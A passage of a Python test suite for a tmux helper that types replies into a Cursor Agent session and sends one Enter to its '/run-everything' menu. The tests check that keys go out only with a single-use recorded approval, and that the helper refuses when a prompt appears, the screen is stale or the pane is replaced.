                                     "--submit", *flags])

    def test_submit_waits_for_a_late_echo(self):
        # The text shows only after 0.5 s: the fence keeps reading, then sends Enter.
        self.env["FAKE_ECHO_DELAY"] = "0.5"
        code, sent = self.submit("continue the source helper")
        self.assertEqual((code, sent["state"], sent["submitted"]), (0, "sent", True))

    def test_submit_ignores_the_same_text_in_history(self):
        # The instruction is already in the transcript above, and the composer stays empty.
        self.env["FAKE_ECHO"] = "0"
        code, refused = self.submit("continue the source helper", screen="  continue the source helper\n\n> \n")
        self.assertEqual((code, refused["state"]), (3, "send-unconfirmed"))
        self.assertEqual([args[-1] for args in self.sends()], ["continue the source helper"])

    def test_submit_ignores_a_short_text_that_matches_a_reply_word(self):
        self.env["FAKE_ECHO"] = "0"
        code, refused = self.submit("continue", screen="  please continue with the work\n\n> \n")
        self.assertEqual((code, refused["state"]), (3, "send-unconfirmed"))

    def test_submit_refuses_enter_when_a_prompt_appears_during_the_wait(self):
        self.screen("  Cursor Agent\n\n> \n")
        self.text_path.write_text("continue the source helper")
        inspected = self.start_and_inspect()
        # A command prompt replaces the screen after the text is typed.
        self.env["FAKE_ECHO_DELAY"] = "60"
        original = self.capture.read_text()

        def swap():
            self.wait_for_literal_send()
            # Same row count, so the visible screen is still located.
            self.capture.write_text(original.replace("  Cursor Agent", "  Run this command?", 1))
        thread = threading.Thread(target=swap)
        thread.start()
        code, refused = self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
                                              "--submit"])
        thread.join()
        self.assertEqual((code, refused["state"]), (3, "modal-approval"))
        self.assertIn("Enter was NOT sent", refused["detail"])
        self.assertNotIn(["send-keys", "-t", "%7", "Enter"], self.sends())

    def test_submit_refuses_an_instruction_that_contains_a_prompt_phrase(self):
        # Its echo could not be told apart from a real prompt with the same words, so a
        # --submit instruction must not contain one; nothing is typed.
        for text in ("answer yes/no: do the tests pass", "say Run this command? to me", "are you sure"):
            with self.subTest(text=text):
                self.restart_case()
                code, refused = self.submit(text)
                self.assertEqual((code, refused["state"]), (2, "invalid-input"))
                self.assertEqual(self.sends(), [])

    def test_submit_refuses_enter_when_a_prompt_appears_under_a_quoted_transcript_row(self):
        # A "> " quote in the transcript looks like a composer row; the prompt below it must
        # still be seen, and the composer is the LAST composer-like row.
        self.screen("> quoted earlier text\n  Cursor Agent\n\n> \n")
        self.text_path.write_text("continue the source helper")
        inspected = self.start_and_inspect()
        self.env["FAKE_ECHO_DELAY"] = "60"
        original = self.capture.read_text()

        def swap():
            self.wait_for_literal_send()
            self.capture.write_text(original.replace("  Cursor Agent", "  Run this command?", 1))
        thread = threading.Thread(target=swap)
        thread.start()
        code, refused = self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
                                              "--submit"])
        thread.join()
        self.assertEqual((code, refused["state"]), (3, "modal-approval"))
        self.assertNotIn(["send-keys", "-t", "%7", "Enter"], self.sends())

    def test_phrase_rows_sees_a_prompt_below_the_composer(self):
        # An unmarked prompt drawn under the composer is seen (the old fence skipped it).
        below = ["  Cursor Agent", "  \u2192 continue the source helper", "  Are you sure? (y/n)", ""]
        self.assertEqual(helper.phrase_rows(below), {"Are you sure? (y/n)"})
        # A real prompt row on the composer rows is seen too.
        other = ["  Cursor Agent", "  \u2192 continue", "  Run this command?", ""]
        self.assertEqual(helper.phrase_rows(other), {"Run this command?"})

    def test_submit_counts_the_text_only_after_the_last_composer_row(self):
        screen = ["> continue the source helper", "", "  \u2192 Add a follow-up", ""]
        self.assertEqual(helper.tail_count(screen, "continue the source helper"), 0)

    def test_submit_keeps_a_replaced_pane_state_after_the_text_is_typed(self):
        # The pane process changes while the fence waits: the reply ends pane-replaced (not
        # send-unconfirmed) and still says the text was sent and Enter was not.
        self.screen("  Cursor Agent\n\n> \n")
        self.text_path.write_text("continue the source helper")
        inspected = self.start_and_inspect()
        pid_file = self.root / "pid"
        self.env["FAKE_PID_FILE"] = str(pid_file)
        self.env["FAKE_ECHO_DELAY"] = "60"

        def swap():
            self.wait_for_literal_send()
            pid_file.write_text("999")
        thread = threading.Thread(target=swap)
        thread.start()
        code, refused = self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
                                              "--submit"])
        thread.join()
        self.assertEqual((code, refused["state"]), (3, "pane-replaced"))
        self.assertIn("Enter was NOT sent", refused["detail"])
        self.assertIn("Do not resend it", refused["detail"])
        self.assertNotIn("Nothing was sent", refused["detail"])
        self.assertNotIn("..", refused["detail"])
        self.assertNotIn(["send-keys", "-t", "%7", "Enter"], self.sends())

    def test_observed_ready_submit_on_an_unlocatable_screen_types_nothing(self):
        # An unclassified screen whose row count does not match tmux's history and pane
        # height: the visible screen cannot be located, so a fenced submit cannot be bound.
        # --observed-ready does not override that: prompt-unclear, and no key is sent.
        self.screen("  build output line\n  another line\n\n")
        self.env["FAKE_HISTORY"] = "7"
        self.text_path.write_text("continue the source helper")
        inspected = self.start_and_inspect()
        self.assertEqual(inspected["classification"], "unclassified")
        code, refused = self.invoke("reply", ["--receipt", inspected["receipt"], "--text-file", str(self.text_path),
                                              "--submit", "--observed-ready"])
        self.assertEqual((code, refused["state"]), (2, "prompt-unclear"))
        self.assertEqual(self.sends(), [])

    def test_submit_refuses_a_text_cursor_would_paste_as_a_placeholder(self):
        code, refused = self.submit("x" * 801)
        self.assertEqual((code, refused["state"]), (2, "invalid-input"))
        self.assertEqual(self.sends(), [])

    def test_help_says_the_caller_owns_the_approval(self):
        result = subprocess.run([sys.executable, str(SCRIPT), "answer", "--help"], capture_output=True,
                                text=True, timeout=10)
        self.assertEqual(result.returncode, 0)
        text = " ".join(result.stdout.split())
        self.assertIn("The caller is responsible for a verified approval", text)
        self.assertIn("does not verify", text)


class LiveG1Tests(unittest.TestCase):
    """The frozen live G1 screen, exact bytes, against the classification alone (no tmux)."""

    def setUp(self):
        temp = tempfile.TemporaryDirectory(prefix="cursor-live-")
        self.addCleanup(temp.cleanup)
        patcher = mock.patch.dict(os.environ, {"XDG_STATE_HOME": temp.name})
        patcher.start()
        self.addCleanup(patcher.stop)
        identity, ledger = LIVE["identity"], LIVE["legacyLedger"]
        self.ref = "OP399-g1-live-fixture"
        entry = dict(ledger, approval_ref=self.ref, choice="a", name=identity["name"], pane_id=identity["pane_id"],
                     pane_pid=identity["pane_pid"], owner=identity["owner"])
        path = helper.approval_path(identity["name"], self.ref)
        path.parent.mkdir(parents=True)
        path.write_text(json.dumps(entry))
        self.state = {key: identity[key] for key in ("name", "pane_id", "pane_pid", "owner", "worktree")}
        self.state["answers"] = [{key: value for key, value in entry.items() if key != "name"}]
        answered = Path(temp.name) / "g1-trust-expected.txt"
        answered.write_bytes(LIVE["answeredText"].encode("utf-8"))
        self.answered = helper.read_answered_text(str(answered))

    def classify(self, capture=None, history=None, answered=True):
        """tmux prints one newline after each row, the last blank row included."""
        geometry = LIVE["geometry"]
        raw = (LIVE["capture"] if capture is None else capture) + "\n"
        rows = helper.capture_rows(raw)
        history = geometry["history_size"] if history is None else history
        height = rows - history
        ident = {"cursor_y": str(height - 1), "height": str(height), "history": str(history)}
        text, truncated = helper.bound_text(raw)
        evidence = helper.answered_trust(self.state, self.answered if answered else None)
        return helper.classify(text, truncated, rows, ident, evidence)

    def test_the_fixture_is_the_frozen_live_bytes(self):
        geometry = LIVE["geometry"]
        self.assertEqual(__import__("hashlib").sha256(LIVE["capture"].encode("utf-8")).hexdigest(), LIVE["captureSha256"])
        self.assertEqual(self.answered[0], LIVE["answeredText"].encode("utf-8"))
        self.assertEqual(__import__("hashlib").sha256(self.answered[0]).hexdigest(),
                         LIVE["legacyLedger"]["expected_text_sha256"])
        self.assertEqual(helper.capture_rows(LIVE["capture"] + "\n"), geometry["capture_rows"])
        self.assertEqual(geometry["capture_rows"], geometry["history_size"] + geometry["pane_height"])
        self.assertEqual(geometry["cursor_y"], geometry["pane_height"] - 1)
        self.assertEqual(helper.bound_text(LIVE["capture"] + "\n"), (LIVE["capture"], False))

    def test_the_live_screen_is_answered_only_with_the_legacy_file(self):
        self.assertEqual(self.classify(), ("unclassified", True, self.ref))
        self.assertEqual(self.classify(answered=False), ("modal-trust", True, None))

    def test_other_splits_of_the_same_capture(self):
        # A different pane height under a different history size, the same 35 rows.
        for history in (0, 2, 5, 11, 13):
            with self.subTest(history=history):
                self.assertEqual(self.classify(history=history), ("unclassified", True, self.ref))
        # With the trust row in history, no prompt is on the visible screen at all.
        for history in (14, 19):
            with self.subTest(history=history):
                self.assertEqual(self.classify(history=history), ("unclassified", True, None))

    def test_a_row_at_the_pane_width(self):
        rows = LIVE["capture"].split("\n")
        rows[33] = rows[33].ljust(80)
        self.assertEqual(len(rows[33]), 80)
        self.assertEqual(self.classify("\n".join(rows)), ("unclassified", True, self.ref))

    def test_a_box_wrapped_by_a_narrower_pane_is_refused(self):
        rows = LIVE["capture"].split("\n")
        wrapped = []
        for index, row in enumerate(rows):
            wrapped += [row[:60], row[60:]] if 2 <= index <= 18 else [row]
        self.assertEqual(self.classify("\n".join(wrapped)), ("modal-trust", True, None))

    def test_status_row_in_history_needs_a_prompt_outside_the_box(self):
        # The status row is the box's last nonblank row. In history, it leaves no visible box
        # row with a prompt phrase: the screen is a trust prompt only through a phrase outside
        # the box, and classify's scan outside the box refuses that.
        rows = LIVE["capture"].split("\n")
        rows[27] = "  [a] Trust this workspace"
        self.assertEqual(self.classify("\n".join(rows), history=17), ("modal-trust", True, None))
        # Without that row nothing on the visible screen is a prompt (visible screen only).
        self.assertEqual(self.classify(history=17), ("unclassified", True, None))

    def test_the_answered_box_needs_cursors_empty_composer_below_it(self):
        # Review of 00606451: Cursor parks the cursor on the blank last row, so the cursor row
        # does not prove a composer. Exactly one row from the box bottom to the cursor row must
        # be Cursor's composer, showing only its placeholder.
        rows = LIVE["capture"].split("\n")
        composer = rows.index("  " + CURSOR_COMPOSER)
        cases = {
            "the trusting moment: the box and status row, nothing below": rows[:19] + [""] * 16,
            "the composer row missing": rows[:composer] + [""] + rows[composer + 1:],
            "the composer holding user text": rows[:composer] + ["  \u2192 fix the reminder test"] + rows[composer + 1:],
            "user text after the placeholder": rows[:composer] + ["  " + CURSOR_COMPOSER + " now"] + rows[composer + 1:],
            "a bare arrow": rows[:composer] + ["  \u2192"] + rows[composer + 1:],
            "a second composer row": rows[:composer] + ["  \u2192 draft line"] + rows[composer:-1],
            "a > composer instead": rows[:composer] + ["  >"] + rows[composer + 1:],
        }
        for label, changed in cases.items():
            with self.subTest(label=label):
                self.assertEqual(len(changed), 35)
                self.assertEqual(self.classify("\n".join(changed)), ("modal-trust", True, None))
        # The composer may sit on the cursor row itself.
        on_cursor = rows[:composer] + rows[composer + 1:] + ["  " + CURSOR_COMPOSER]
        self.assertEqual(len(on_cursor), 35)
        self.assertEqual(self.classify("\n".join(on_cursor)), ("unclassified", True, self.ref))

    def test_a_cropped_box_is_refused(self):
        rows = LIVE["capture"].split("\n")
        cropped = {
            "the bottom border cut": rows[:18] + rows[19:] + [""],
            "the right border cut": [row[:70] if 2 <= index <= 18 else row for index, row in enumerate(rows)],
            "the status row cut": [row[:10] if index == 16 else row for index, row in enumerate(rows)],
        }
        for label, kept in cropped.items():
            with self.subTest(label=label):
                self.assertEqual(self.classify("\n".join(kept))[0], "modal-trust")


RUN_ROWS = [
    "Cursor Agent v2026.10.14-0f9edde",
    "\u2192 /run-everything    Toggle Run Everything (currently disabled)",
    "\u2192 /run-everything",
    "  Grok 4.7 256K Extra High \u00b7 7.3%",
    "  ~/work/example-task",
]
RUN_EXPECT = "\u2192 /run-everything    Toggle Run Everything (currently disabled)\n\u2192 /run-everything\n"
RUN_APPROVAL = "OP192-run-everything-2026-11-06T06:20:00Z"
MENU_APPROVAL = "OP192-menu-key-2026-11-06T06:10:00Z"
MENU_APPROVAL_2 = "OP192-menu-key-2026-11-06T06:12:00Z"


class MenuKeyTests(AnswerFixture):
    """menu-key sends one Enter to the live /run-everything menu row (while it reads currently disabled), once per approval."""

    def setUp(self):
        super().setUp()
        self.menu_expect = self.root / "expect-menu"
        self.menu_expect.write_text(RUN_EXPECT)
        self.show(RUN_ROWS)

    def show(self, rows):
        capture = "\n".join(rows) + "\n\n"
        self.capture.write_text(capture)
        for typed in (".echo", ".stale"):
            Path(str(self.capture) + typed).unlink(missing_ok=True)
        self.env["FAKE_HEIGHT"] = str(len(capture.splitlines()))
        self.env["FAKE_CURSOR_Y"] = str(len(capture.splitlines()) - 1)
        self.env["FAKE_HISTORY"] = "0"

    def sends(self):
        return [args for args in self.commands("tmux") if args[0] == "send-keys"]

    def state(self, name=None):
        return json.loads((self.root / "state" / "cursor-interactive-session" / (name or self.name)).read_text())

    def restart_case(self):
        self.log.unlink(missing_ok=True)
        (self.root / "state" / "cursor-interactive-session" / self.name).unlink(missing_ok=True)

    def args(self, receipt, kind="run-everything-menu", approval=MENU_APPROVAL, expect=None):
        default = self.menu_expect
        return ["--receipt", receipt, "--approval-ref", approval, "--expect-kind", kind,
                "--expect-text-file", str(expect or default)]

    def menu_ledger(self, approval=MENU_APPROVAL):
        digest = __import__("hashlib").sha256(approval.encode("utf-8")).hexdigest()
        return self.root / "state" / "cursor-interactive-session" / "approvals" / digest

    def test_menu_sends_exactly_one_enter_and_records_it(self):
        inspected = self.start_and_inspect()
        code, sent = self.invoke("menu-key", self.args(inspected["receipt"]))
        self.assertEqual((code, sent["state"], sent["key"]), (0, "key-sent", "Enter"))
        self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "Enter"]])
        record = json.loads(self.menu_ledger().read_text())
        self.assertEqual((record["kind"], record["key"], record["outcome"], record["pane_id"], record["pane_pid"]),
                         ("run-everything-menu", "Enter", "sent", "%7", "123"))
        self.assertNotIn("Show plan", json.dumps(record))
        self.assertEqual(self.state()["receipt_id"], "")
        # The approval and the receipt are spent: nothing more goes out.
        code, again = self.invoke("menu-key", self.args(inspected["receipt"]))
        self.assertEqual((code, again["state"]), (2, "approval-spent"))
        code, other = self.invoke("menu-key", self.args(inspected["receipt"], approval=MENU_APPROVAL_2))
        self.assertEqual((code, other["state"]), (2, "stale-receipt"))
        self.assertEqual(len(self.sends()), 1)

    def test_wrong_screen_sends_nothing_and_keeps_the_approval(self):
        usage_menu = ["Cursor Agent v2026.10.14-0f9edde", "\u2192 /usage    Show plan and on-demand usage", "\u2192 /usage",
                      "  ~/work/example-task"]
        composer = ["Cursor Agent v2026.10.14-0f9edde", "\u2192 Add a follow-up", "  ~/work/example-task"]
        for label, rows in (("another command's menu", usage_menu), ("a plain composer", composer)):
            with self.subTest(label=label):
                self.restart_case()
                self.log.write_text("")
                self.show(rows)
                inspected = self.start_and_inspect()
                code, refused = self.invoke("menu-key", self.args(inspected["receipt"]))
                self.assertEqual((code, refused["state"]), (2, "screen-mismatch"))
                self.assertEqual(self.sends(), [])
                self.assertFalse(self.menu_ledger().exists())
                self.assertNotEqual(self.state()["receipt_id"], "")

    def test_a_different_selected_command_or_an_argument_draft_is_not_the_run_everything_menu(self):
        other = ["Cursor Agent v2026.10.14-0f9edde", "\u2192 /auto-review    Toggle Auto-review (currently disabled)", "\u2192 /auto-review"]
        argument = ["Cursor Agent v2026.10.14-0f9edde", RUN_ROWS[1], "\u2192 /run-everything on"]
        for label, rows in (("other command", other), ("argument draft", argument)):
            with self.subTest(label=label):
                self.restart_case()
                self.log.write_text("")
                self.show(rows)
                inspected = self.start_and_inspect()
                code, refused = self.invoke("menu-key", self.args(inspected["receipt"]))
                self.assertEqual((code, refused["state"]), (2, "screen-mismatch"))
                self.assertEqual(self.sends(), [])

    def test_a_prompt_on_screen_is_never_answered_with_a_key(self):
        rows = RUN_ROWS + ["Do you trust this workspace? [a] Trust"]
        self.show(rows)
        inspected = self.start_and_inspect()
        self.assertEqual(inspected["classification"], "modal-trust")
        code, refused = self.invoke("menu-key", self.args(inspected["receipt"]))
        self.assertEqual((code, refused["state"]), (2, "modal-trust"))
        self.assertEqual(self.sends(), [])

    def test_stale_receipt_and_changed_pane_refuse_without_spending(self):
        inspected = self.start_and_inspect()
        self.show(RUN_ROWS + ["extra row"])
        code, refused = self.invoke("menu-key", self.args(inspected["receipt"]))
        self.assertEqual((code, refused["state"]), (2, "stale-receipt"))
        self.show(RUN_ROWS)
        for mode, state in (("replaced", "pane-replaced"), ("new-pane", "pane-replaced"), ("foreign-owner", "not-owned"),
                            ("foreign-command", "pane-replaced"), ("dead", "pane-dead"), ("copy-mode", "pane-in-mode")):
            with self.subTest(mode=mode):
                code, refused = self.invoke("menu-key", self.args(inspected["receipt"]), mode=mode)
                self.assertEqual(code, 2)
                self.assertIn(refused["state"], {state, "stale-receipt"})
        self.assertEqual(self.sends(), [])
        self.assertFalse(self.menu_ledger().exists())

    def test_input_is_checked_before_any_tmux_call(self):
        inspected = self.start_and_inspect()
        receipt = inspected["receipt"]
        no_draft = self.root / "no-draft"
        no_draft.write_text(RUN_ROWS[1] + "\n")
        no_selected = self.root / "no-selected"
        no_selected.write_text("\u2192 /run-everything\n")
        prompt = self.root / "prompt"
        prompt.write_text(RUN_EXPECT + "Are you sure? (y/n)\n")
        cases = [
            ("kind unknown", self.args(receipt, kind="modal-trust")),
            ("kind usage", self.args(receipt, kind="usage-menu")),
            ("approval short", self.args(receipt, approval="ok")),
            ("approval spaces", self.args(receipt, approval="Tom said ok to this")),
            ("no draft row", self.args(receipt, expect=no_draft)),
            ("no selected row", self.args(receipt, expect=no_selected)),
            ("prompt phrase", self.args(receipt, expect=prompt)),
            ("missing file", self.args(receipt, expect=self.root / "absent")),
        ]
        for label, extra in cases:
            with self.subTest(label=label):
                self.log.write_text("")
                code, refused = self.invoke("menu-key", extra)
                self.assertEqual((code, refused["state"]), (2, "invalid-input"))
                self.assertEqual(self.commands("tmux"), [])
        self.assertNotEqual(self.state()["receipt_id"], "")

    def test_a_send_failure_is_uncertain_and_never_retried(self):
        inspected = self.start_and_inspect()
        code, failed = self.invoke("menu-key", self.args(inspected["receipt"]), mode="send-fail")
        self.assertEqual((code, failed["state"]), (3, "key-unconfirmed"))
        self.assertEqual(json.loads(self.menu_ledger().read_text())["outcome"], "uncertain")
        code, again = self.invoke("menu-key", self.args(inspected["receipt"]))
        self.assertEqual((code, again["state"]), (2, "approval-spent"))

    def test_menu_key_and_answer_share_one_ledger(self):
        # One approval reference is spent once across both commands: the menu entry lives in answer's approvals/ ledger.
        self.assertEqual(helper.approval_path(self.name, MENU_APPROVAL).parent.name, "approvals")
        self.assertEqual(helper.approval_path(self.name, MENU_APPROVAL).name, self.menu_ledger().name)
        inspected = self.start_and_inspect()
        self.log.write_text("")
        code, sent = self.invoke("menu-key", self.args(inspected["receipt"]))
        self.assertEqual((code, sent["state"]), (0, "key-sent"))
        self.assertEqual(json.loads(self.menu_ledger().read_text())["kind"], "run-everything-menu")
        self.assertNotIn("answers", self.state())
        # A reference already spent by answer is refused here, before any tmux call.
        self.restart_case()
        self.menu_ledger(MENU_APPROVAL_2).parent.mkdir(parents=True, exist_ok=True)
        self.menu_ledger(MENU_APPROVAL_2).write_text(json.dumps({"approval_ref": MENU_APPROVAL_2, "kind": "modal-trust"}))
        inspected = self.start_and_inspect()
        self.log.write_text("")
        code, refused = self.invoke("menu-key", self.args(inspected["receipt"], approval=MENU_APPROVAL_2))
        self.assertEqual((code, refused["state"]), (2, "approval-spent"))
        self.assertEqual(self.sends(), [])

    def history_show(self, history_rows, visible_rows):
        """A capture whose first rows are scrolled history and whose last rows are the visible pane."""
        capture = "\n".join(history_rows + visible_rows) + "\n\n"
        self.capture.write_text(capture)
        for typed in (".echo", ".stale"):
            Path(str(self.capture) + typed).unlink(missing_ok=True)
        height = len(visible_rows) + 1
        self.env["FAKE_HEIGHT"] = str(height)
        self.env["FAKE_CURSOR_Y"] = str(height - 1)
        self.env["FAKE_HISTORY"] = str(len(history_rows))

    def real_pane_rows(self):
        """The shape of the real review pane: the answered trust box scrolled into history, the review
        output, then the menu, the typed draft and the status rows (synthetic text, real layout)."""
        trust = [row for row in (boxed(ANSWERED_BOX_ROWS).replace(EXAMPLE_PATH, "/home/dev/work/example-task")).split("\n")]
        history = trust + ["", "  Review: no findings.", "  Done."] * 6
        visible = ["  Done.", "", RUN_ROWS[1], RUN_ROWS[2], "",
                   "  Grok 4.7 256K Extra High \u00b7 7.3%", "  ~/work/example-task"]
        return history, visible

    def test_trust_text_scrolled_into_history_does_not_block_the_menu_key(self):
        history, visible = self.real_pane_rows()
        self.history_show(history, visible)
        inspected = self.start_and_inspect()
        self.assertNotIn(inspected["classification"], {"modal-trust", "modal-permission", "modal-approval", "modal-unknown"})
        code, sent = self.invoke("menu-key", self.args(inspected["receipt"]))
        self.assertEqual((code, sent["state"]), (0, "key-sent"))
        self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "Enter"]])

    def test_trust_box_still_on_the_visible_screen_refuses(self):
        # Not scrolled away: the box is part of the visible screen and the composer is not empty.
        box = [row for row in boxed(ANSWERED_BOX_ROWS).split("\n")]
        self.show(box + RUN_ROWS[1:])
        inspected = self.start_and_inspect()
        self.assertTrue(inspected["classification"].startswith("modal-"))
        code, refused = self.invoke("menu-key", self.args(inspected["receipt"]))
        self.assertEqual((code, refused["state"].startswith("modal-")), (2, True))
        self.assertEqual(self.sends(), [])

    def test_a_new_real_prompt_refuses_in_the_real_pane_layout(self):
        history, visible = self.real_pane_rows()
        self.history_show(history, visible + ["  Allow this command: git push", "  (y) Run once"])
        inspected = self.start_and_inspect()
        code, refused = self.invoke("menu-key", self.args(inspected["receipt"]))
        self.assertEqual(code, 2)
        self.assertTrue(refused["state"].startswith("modal-"))
        self.assertEqual(self.sends(), [])

    def test_a_pane_that_changes_after_the_approval_is_spent_gets_no_key(self):
        changes = {
            "an extra row appeared": {"capture": "\n".join(RUN_ROWS[:1] + ["extra row"] + RUN_ROWS[1:]) + "\n\n"},
            "the menu row was replaced": {"capture": "\n".join([RUN_ROWS[0], "\u2192 /usage-credits    Configure", *RUN_ROWS[2:]]) + "\n\n"},
            "the pane process was replaced": {"env": {"FAKE_PID": "999"}},
        }
        for label, change in changes.items():
            with self.subTest(label=label):
                self.restart_case()
                for path in (self.root / "state" / "cursor-interactive-session" / "approvals").glob("*"):
                    path.unlink()
                self.env["FAKE_PID"] = "123"
                self.show(RUN_ROWS)
                inspected = self.start_and_inspect()
                args = argparse.Namespace(name=self.name, tmux=self.tmux, receipt=inspected["receipt"],
                                          approval_ref=MENU_APPROVAL, expect_kind="run-everything-menu",
                                          expect_text_file=str(self.menu_expect))
                original = helper.spend_approval

                def spend_then_change(path, entry):
                    original(path, entry)
                    if "capture" in change:
                        self.capture.write_text(change["capture"])
                    for key, value in change.get("env", {}).items():
                        os.environ[key] = value

                with mock.patch.dict(os.environ, self.env), mock.patch.object(helper, "spend_approval", spend_then_change):
                    with self.assertRaises(helper.Refusal) as caught:
                        helper.menu_key_session(args)
                self.assertEqual((caught.exception.state, caught.exception.code), ("screen-changed", 2))
                self.assertEqual(self.sends(), [])
                self.assertEqual(json.loads(self.menu_ledger().read_text())["outcome"], "not-sent")
                self.assertEqual(self.state()["receipt_id"], "")

    def test_an_unmarked_menu_row_is_not_the_selected_row(self):
        unmarked = self.root / "unmarked"
        unmarked.write_text("/run-everything    Toggle Run Everything (currently disabled)\n\u2192 /run-everything\n")
        inspected = self.start_and_inspect()
        self.log.write_text("")
        code, refused = self.invoke("menu-key", self.args(inspected["receipt"], expect=unmarked))
        self.assertEqual((code, refused["state"]), (2, "invalid-input"))
        self.assertEqual(self.commands("tmux"), [])

    def test_run_everything_never_toggles_off_or_takes_an_argument(self):
        refused_rows = {
            "currently enabled": "\u2192 /run-everything    Toggle Run Everything (currently enabled)\n\u2192 /run-everything\n",
            "sandbox only": "\u2192 /run-everything    Run in Sandbox\n\u2192 /run-everything\n",
            "disabled by admin": "\u2192 /run-everything    Run Everything is disabled by admin settings\n\u2192 /run-everything\n",
            "argument form": "\u2192 /run-everything    Toggle Run Everything (currently disabled)\n\u2192 /run-everything on\n",
            "no selection marker": "/run-everything    Toggle Run Everything (currently disabled)\n\u2192 /run-everything\n",
            "no draft row": "\u2192 /run-everything    Toggle Run Everything (currently disabled)\n",
            "another command's rows": "\u2192 /usage    Show plan and on-demand usage\n\u2192 /usage\n",
        }
        self.show(RUN_ROWS)
        inspected = self.start_and_inspect()
        for label, text in refused_rows.items():
            with self.subTest(label=label):
                expect = self.root / ("expect-" + label.replace(" ", "-"))
                expect.write_text(text)
                self.log.write_text("")
                code, refused = self.invoke("menu-key", self.args(inspected["receipt"], kind="run-everything-menu",
                                                                    approval=RUN_APPROVAL, expect=expect))
                self.assertEqual((code, refused["state"]), (2, "invalid-input"))
                self.assertEqual(self.commands("tmux"), [])
        self.assertFalse(self.menu_ledger(RUN_APPROVAL).exists())

    def test_a_screen_showing_the_enabled_row_is_refused_even_with_the_disabled_text(self):
        # The caller's text says disabled, but the pane shows "(currently enabled)": the toggle would turn it OFF.
        enabled = [RUN_ROWS[0], "\u2192 /run-everything    Toggle Run Everything (currently enabled)", RUN_ROWS[2]]
        expect = self.root / "expect-run"
        expect.write_text(RUN_EXPECT)
        self.show(enabled)
        inspected = self.start_and_inspect()
        self.log.write_text("")
        code, refused = self.invoke("menu-key", self.args(inspected["receipt"], kind="run-everything-menu",
                                                            approval=RUN_APPROVAL, expect=expect))
        self.assertEqual((code, refused["state"]), (2, "screen-mismatch"))
        self.assertEqual(self.sends(), [])

    def run_expect(self):
        path = self.root / "expect-run"
        path.write_text(RUN_EXPECT)
        return path

    def test_a_menu_that_sits_only_in_history_is_not_the_live_menu(self):
        composer = ["  Review: no findings.", "", "\u2192 Add a follow-up", "  Grok 4.7 256K Extra High \u00b7 7.3%", "  ~/work/example-task"]
        for kind, rows, expect in (("run-everything-menu", RUN_ROWS, self.menu_expect),
                                   ("run-everything-menu", RUN_ROWS, self.run_expect())):
            with self.subTest(kind=kind):
                self.restart_case()
                self.history_show(rows[1:] + ["  more output"] * 3, composer)
                inspected = self.start_and_inspect()
                self.log.write_text("")
                code, refused = self.invoke("menu-key", self.args(inspected["receipt"], kind=kind, approval=RUN_APPROVAL + kind,
                                                                    expect=expect))
                self.assertEqual((code, refused["state"]), (2, "screen-mismatch"))
                self.assertEqual(self.sends(), [])

    def test_an_old_visible_copy_above_a_later_composer_is_not_the_live_menu(self):
        later = RUN_ROWS[1:] + ["  Review: no findings.", "\u2192 Add a follow-up", "  ~/work/example-task"]
        self.show(later)
        inspected = self.start_and_inspect()
        self.log.write_text("")
        code, refused = self.invoke("menu-key", self.args(inspected["receipt"]))
        self.assertEqual((code, refused["state"]), (2, "screen-mismatch"))
        self.assertEqual(self.sends(), [])

    def test_the_menu_and_draft_rows_must_be_adjacent(self):
        apart = [RUN_ROWS[0], RUN_ROWS[1], "  some other row", RUN_ROWS[2]]
        self.show(apart)
        inspected = self.start_and_inspect()
        self.log.write_text("")
        code, refused = self.invoke("menu-key", self.args(inspected["receipt"]))
        self.assertEqual((code, refused["state"]), (2, "screen-mismatch"))
        self.assertEqual(self.sends(), [])

    def test_run_everything_in_the_real_pane_layout_sends_one_enter(self):
        history, _visible = self.real_pane_rows()
        visible = ["  Done.", "", RUN_ROWS[1], RUN_ROWS[2], "", "  Grok 4.7 256K Extra High \u00b7 7.3%", "  ~/work/example-task"]
        self.history_show(history, visible)
        inspected = self.start_and_inspect()
        self.assertNotIn(inspected["classification"], {"modal-trust", "modal-permission", "modal-approval", "modal-unknown"})
        self.log.write_text("")
        code, sent = self.invoke("menu-key", self.args(inspected["receipt"], kind="run-everything-menu", approval=RUN_APPROVAL,
                                                         expect=self.run_expect()))
        self.assertEqual((code, sent["state"], sent["key"]), (0, "key-sent", "Enter"))
        self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "Enter"]])

    def test_a_prompt_that_appears_after_the_approval_is_spent_gets_no_key(self):
        self.show(RUN_ROWS)
        inspected = self.start_and_inspect()
        args = argparse.Namespace(name=self.name, tmux=self.tmux, receipt=inspected["receipt"], approval_ref=RUN_APPROVAL,
                                  expect_kind="run-everything-menu", expect_text_file=str(self.run_expect()))
        original = helper.spend_approval

        def spend_then_prompt(path, entry):
            original(path, entry)
            self.capture.write_text("\n".join(RUN_ROWS + ["Do you trust this workspace? [a] Trust"]) + "\n\n")
            os.environ["FAKE_HEIGHT"] = str(len(RUN_ROWS) + 2)

        with mock.patch.dict(os.environ, self.env), mock.patch.object(helper, "spend_approval", spend_then_prompt):
            with self.assertRaises(helper.Refusal) as caught:
                helper.menu_key_session(args)
        self.assertEqual(caught.exception.state, "screen-changed")
        self.assertEqual(self.sends(), [])

    def test_a_menu_in_history_with_no_composer_on_the_visible_screen_is_not_the_live_menu(self):
        busy = ["  Running tests...", "  ok  pkg/a", "  ok  pkg/b", "  ~/work/example-task"]
        self.history_show(RUN_ROWS[1:] + ["  more output"] * 3, busy)
        inspected = self.start_and_inspect()
        self.log.write_text("")
        code, refused = self.invoke("menu-key", self.args(inspected["receipt"]))
        self.assertEqual((code, refused["state"]), (2, "screen-mismatch"))
        self.assertEqual(self.sends(), [])

    def refused_screen(self, rows, label, state="screen-mismatch", cursor=None):
        self.restart_case()
        self.log.write_text("")
        self.show(rows)
        if cursor is not None:
            self.env["FAKE_CURSOR_Y"] = str(cursor)
        inspected = self.start_and_inspect()
        self.log.write_text("")
        code, refused = self.invoke("menu-key", self.args(inspected["receipt"]))
        self.assertEqual((code, refused["state"]), (2, state), label)
        self.assertEqual(self.sends(), [], label)
        self.assertFalse(self.menu_ledger().exists(), label)

    def test_copies_of_the_rows_never_stand_in_for_the_live_menu(self):
        head, selected, draft, model, path = RUN_ROWS
        enabled = "\u2192 /run-everything    Toggle Run Everything (currently enabled)"
        cases = {
